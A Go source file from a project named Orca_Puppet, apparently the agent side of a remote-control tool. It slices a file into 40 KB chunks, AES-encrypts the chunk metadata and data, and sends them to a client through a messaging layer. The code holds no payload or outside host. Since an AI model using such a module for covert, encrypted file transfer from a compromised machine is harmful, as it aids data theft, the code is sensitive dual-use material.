package fileopt

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/config"
	"Orca_Puppet/define/debug"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"encoding/json"
	"io"
	"log"
	"math"
	"os"
)

const SliceBytes = 40 * 1024 // 分片大小

// 获取文件大小
func GetFileSize(path string) int64 {
	fh, err := os.Stat(path)
	if err != nil {
		log.Printf("读取文件%s失败, err: %s\n", path, err)
	}
	return fh.Size()
}

// 获取文件片元信息
func GetFileSliceInfo(fileName string) (int, int64) {
	filesize := GetFileSize(fileName)                                     // 文件大小
	sliceBytes := SliceBytes                                              // 分片大小
	sliceNum := int(math.Ceil(float64(filesize)/float64(sliceBytes))) - 1 // 分片数量-1
	remainSize := filesize - int64(sliceNum*sliceBytes)                   // 最后一个分片大小
	return sliceNum, remainSize
}

// 获取文件元信息，并加密
func GetFileMetaInfo(uploadFile, saveFile string) string {
	sliceNum, remainSize := GetFileSliceInfo(uploadFile)
	sliceSize := int64(SliceBytes)
	md5sum := util.GetFileMd5Sum(uploadFile)
	fileMetaInfo := FileMetaInfo{
		Fid:          util.GenUUID(),
		SaveFileName: saveFile,
		SliceNum:     sliceNum,
		SliceSize:    sliceSize,
		RemainSize:   remainSize,
		Md5sum:       md5sum,
	}
	metaInfo, err := json.Marshal(fileMetaInfo)
	if err != nil {
		return ""
	}
	data, _ := crypto.Encrypt(metaInfo, []byte(config.AesKey))
	return data
}

// 发送文件元信息
func SendFileMetaMsg(clientId, metaData string) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "fileSend"
	data := metaData
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data, "")
	return retData
}

// 发送文件分片数据
func SendFileSliceMsg(clientId string, sliceData []byte) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "sliceData"
	data, _ := crypto.Encrypt(sliceData, []byte(config.AesKey))
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data, "")
	return retData
}

// 发送文件
func SendFileData(clientId string, uploadFile string) {
	sliceNum, remainSize := GetFileSliceInfo(uploadFile)
	sliceSize := int64(SliceBytes)
	pUploadFile, _ := os.Open(uploadFile)
	defer pUploadFile.Close()
	for i := 0; i < sliceNum; i++ {
		sliceData := make([]byte, sliceSize)
		_, err := pUploadFile.Read(sliceData)
		if err != nil && err != io.EOF {
			debug.DebugPrint(err.Error())
		}
		SendFileSliceMsg(clientId, sliceData)
	}
	// 处理最后一个分片
	sliceData := make([]byte, remainSize)
	_, err := pUploadFile.Read(sliceData)
	if err != nil && err != io.EOF {
		debug.DebugPrint(err.Error())
		return
	}
	SendFileSliceMsg(clientId, sliceData)
}
